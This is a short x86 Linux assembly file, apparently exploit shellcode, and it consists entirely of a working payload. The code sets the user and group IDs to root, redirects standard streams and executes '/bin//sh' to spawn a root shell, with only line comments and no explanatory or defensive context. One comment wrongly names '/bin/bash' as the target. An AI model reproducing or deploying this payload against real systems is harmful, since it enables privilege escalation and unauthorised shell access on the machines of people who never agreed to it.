section .text
	global _start

_start:
 ; setuid(0)
 push BYTE 0x17      ; setuid syscall number
 pop eax             ; put it inside eax
 xor ebx,ebx         ; putting the argument 0 
 int 0x80            ; calling the syscall

 ; setgid(0)
 push BYTE 0x2e      ; setgid syscall number
 pop eax             ; put it inside eax
                     ; ebx already zero so don't need
 int 0x80            ; calling the syscall

 ; dup2(0,1) + dup2(0,2)
 xor eax,eax         ; zeroing eax
 push BYTE 0x2       ; pusing 0x2 to the stack
 pop ecx             ; putting the argument 2
 dup_loop: 
  mov BYTE al,0x3f   ; putting syscall number in eax
  int 0x80           ; calling the syscall
  dec ecx            ; reduce ecx by 1
  cmp ecx,0
  jne dup_loop

 ; execve('/bin/bash', char* argv[], char* envp[]))
 xor eax,eax         ; zeroing eax
 xor edx,edx         ; zeroing edx
 mov BYTE al,11      ; putting syscall number of execve inside eax
 push edx            ; putting a null byte to terminate the string
 push 0x68732f2f     ; push '//sh' to the stack
 push 0x6e69622f     ; push '/bin' to the stack
 mov ebx,esp         ; putting the pointer to the string inside ebx
 push edx            ; pushing zero to stack for pointer to nothing for execve
 mov edx,esp         ; putting null pointer to edx
 push ebx            ; putting env pointer to the string '/bin//sh'
 mov ecx,esp         ; giving the pointer to ecx
 int 0x80

 ; exit(0)
 xor eax,eax         ; zeroing eax
 mov BYTE al,1       ; putting syscall number inside eax
 xor ebx,ebx         ; putting the argument 0
 int 0x80            ; calling the syscall
